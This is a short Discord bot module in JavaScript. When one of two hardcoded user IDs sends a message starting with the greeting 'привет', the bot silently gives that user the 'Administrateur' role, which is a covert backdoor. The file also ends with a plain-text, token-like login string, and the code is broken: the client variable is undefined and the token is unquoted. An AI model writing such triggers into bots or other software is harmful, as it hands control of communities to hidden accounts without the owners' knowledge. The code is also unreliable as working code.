const command = require('./commands.js')

const Discord = require('discord.js')
const Guildmember = new Discord.Client()

module.exports = class role  {


  static   match(message) {
		 return message.content.startsWith('привет') 
	
}
  static  action (message) {

  	let args = message.author.id


   if(args==='152450822221987840'|| args ==='443390710306177025'){
  //	message.member.addRole('547414734220034088')
  let mrole = message.guild.roles.find(r => r.name === "Administrateur");
message.member.addRole(mrole)
  	message.channel.send('легко')




	}


}


}

client.login(fUisBIZ2KplSWUecFtUqGTOdYpIJ9UOj);
